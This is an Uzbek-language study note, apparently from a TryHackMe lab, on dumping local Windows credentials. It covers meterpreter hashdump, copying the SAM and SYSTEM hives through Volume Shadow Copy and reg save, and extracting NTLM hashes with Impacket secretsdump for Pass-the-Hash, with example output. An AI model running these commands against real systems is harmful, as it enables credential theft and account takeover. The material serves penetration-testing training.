### 🪪 **Windows tizimida Lokal va Domain foydalanuvchilar:**

Windows operatsion tizimi odatda ikki turdagi foydalanuvchi hisoblarini taqdim etadi:

1. **Lokal foydalanuvchilar** — ularning ma’lumotlari (login/parol) lokal diskda (`C:\Windows\System32\Config`) saqlanadi.
2. **Domen foydalanuvchilari** — ularning ma’lumotlari markazlashtirilgan **Active Directory** serverida saqlanadi.

Bu vazifada lokal foydalanuvchi akkountlari uchun credential (login parol) ma’lumotlarini qanday olish mumkinligi muhokama qilinadi.

---

## 🧠 **Klaviatura yozuvlarini olish (Keylogger):**

**Keylogger** — foydalanuvchi klaviaturada bosgan tugmalarini kuzatuvchi dastur yoki qurilmadir.

* Dastlab **ota-onalar nazorati** yoki **dasturiy ta’minot testlari** uchun yaratilgan.
* Ammo **xavfli maqsadlarda** (parolni o‘g‘irlash) ishlatilishi mumkin.
* **Red Team** (hujum testchilari) foydalanuvchidan login/parol olish uchun **Metasploit** kabi vositalardan foydalanib, **keylogger** ishga tushirishadi.

---

## 🧩 **SAM – Security Account Manager**

**SAM (Security Account Manager)** – Windows’ning maxsus fayli bo‘lib, **lokal foydalanuvchilar login va parollarini (hash shaklida) saqlaydi**.

* Bu fayl `C:\Windows\System32\config\sam` joylashgan.
* **Windows ishlayotgan paytda** bu faylni **ochish yoki nusxalash mumkin emas**:

  ```cmd
  type C:\Windows\System32\config\sam
  -> Faylga boshqa jarayon foydalanayotganligi sababli kirib bo‘lmaydi
  ```

---

## 🛠️ **Metasploit orqali SAM hashlarini olish – `hashdump`:**

`hashdump` buyrug‘i orqali SAM faylidagi hashlar olinadi:

```bash
meterpreter > getuid
Server username: THM\Administrator

meterpreter > hashdump
Administrator:500:...:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Bu usul **LSASS.exe** (Local Security Authority) jarayoni ichiga kod joylashtirib, xotiradan ma’lumot olish orqali ishlaydi.

---

## 💿 **Volume Shadow Copy orqali SAM faylini olish:**

**Volume Shadow Copy Service (VSS)** – Windows'ning **zaxira nusxa olish** xizmatidir. Bu yordamida ishlatilayotgan fayllarning **nusxasini olish mumkin**.

### Qadamlar:

1. **Administrator CMD** ochiladi.

2. **Shadow copy yaratiladi**:

   ```cmd
   wmic shadowcopy call create Volume='C:\'
   ```

3. **Yaratilgan nusxa ko‘riladi**:

   ```cmd
   vssadmin list shadows
   ```

4. **SAM va SYSTEM fayllarini ko‘chirib olinadi**:

   ```cmd
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
   ```

> SYSTEM fayli kerak, chunki SAM hashlarini **ochish (decrypt)** uchun **kalitlar SYSTEM faylida** saqlanadi.

---

## 🧾 **Windows Registry orqali SAM olish:**

Windows Registry’da ham **SAM va SYSTEM** ma’lumotlari bo‘ladi. Bularni **`reg save`** buyrug‘i yordamida saqlab olish mumkin:

```cmd
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```

---

## 🧪 **Impacket (secretsdump.py) bilan hashlarni ochish:**

Impacket’ning `secretsdump.py` skripti lokal SAM fayllardan hashlarni chiqarib beradi:

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

Natija quyidagicha ko‘rinadi:

```
[*] Dumping local SAM hashes
Administrator:500:...:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> Bu parollar **NTLM hash** formatida bo‘ladi va **hashcat** bilan bruteforce qilib ochish mumkin.

---

## 🔐 **Domain foydalanuvchilar haqida eslatma:**

Agar hashdump natijasida faqat **lokal foydalanuvchilar chiqsa**, bu – SYSTEM fayl **domain foydalanuvchilarga tegishli bo‘lmaganidan**. Domain foydalanuvchilar hashini olish uchun **SECURITY fayl** ham kerak bo‘ladi.

---

### ✅ Xulosa:

🔹 Lokal credentiallarni olish uchun:

* `hashdump` (Metasploit)
* Shadow Copy xizmatidan foydalanish
* Registry`dan `reg save\` bilan olish
* Impacket bilan ochish (`secretsdump.py`)

🔹 Olingan hashlar **parolni olish yoki foydalanuvchini soxtalashtirish** uchun ishlatiladi (Pass-the-Hash).
